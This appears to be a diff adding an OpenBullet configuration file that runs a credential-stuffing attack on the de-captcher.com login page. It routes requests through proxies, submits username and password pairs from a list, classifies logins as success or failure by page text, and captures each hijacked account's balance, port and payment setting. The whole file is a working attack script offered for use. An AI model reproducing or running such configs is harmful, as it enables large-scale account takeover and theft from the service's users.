@@ -1,0 +1,68 @@
+[SETTINGS]
+{
+  "Name": "BB2 - Decaptcher",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-09T14:22:29.6237203+00:00",
+  "AdditionalInfo": "",
+  "Author": "demiurgo",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Come ti chiami",
+      "VariableName": "NAME",
+      "Id": 858450526
+    },
+    {
+      "Description": "Quanti anni hai",
+      "VariableName": "AGE",
+      "Id": 695275800
+    }
+  ],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST_GET REQUEST GET "https://de-captcher.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<img src=\"cap/captcha.php\"" 
+#PARSE_JSPSESSID PARSE "<COOKIES(JSPSESSID)>" LR "" "" Recursive=FALSE -> VAR "JSPSESSIDz" "" "" 
+#REQUEST_POST REQUEST POST "https://de-captcher.com/" AutoRedirect=TRUE 
+  CONTENT "action=client_login&login=<USER>&password=<PASS>&do_login.x=0&do_login.y=0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://de-captcher.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://de-captcher.com/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "/>Sorry, but you typed something wrong.<" 
+  KEYCHAIN Success OR 
+    KEY ">Port</td><td class=\"td_border\">" 
+#Capture_Balance PARSE "<SOURCE>" LR "%\">Balance</td><td class=\"td_border\">" "</td></tr" Recursive=FALSE -> CAP "Balance" "" "" 
+#Capture_Port PARSE "<SOURCE>" LR ">Port</td><td class=\"td_border\">" "</td></tr" Recursive=FALSE -> CAP "Port" "" "" 
+#Capture_Priority_Payment PARSE "<SOURCE>" LR ">Priority Payment</td><td class=\"td_border\">" "</td></tr" Recursive=FALSE -> CAP "Payment" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY ">Balance</td><td class=\"td_border\">$-" 
